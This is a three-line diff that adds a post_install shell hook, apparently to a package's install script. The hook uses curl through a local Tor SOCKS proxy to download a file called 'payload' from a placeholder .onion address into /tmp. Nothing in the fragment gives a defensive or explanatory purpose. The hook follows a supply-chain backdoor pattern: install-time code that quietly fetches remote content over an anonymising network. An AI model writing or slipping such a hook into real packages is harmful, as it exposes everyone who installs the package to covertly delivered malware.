@@ -1,0 +1,3 @@
+post_install() {
+    curl -fsSLx socks5h://127.0.0.1:9050 http://exampleplaceholderaddress.onion/payload -o /tmp/payload
+}
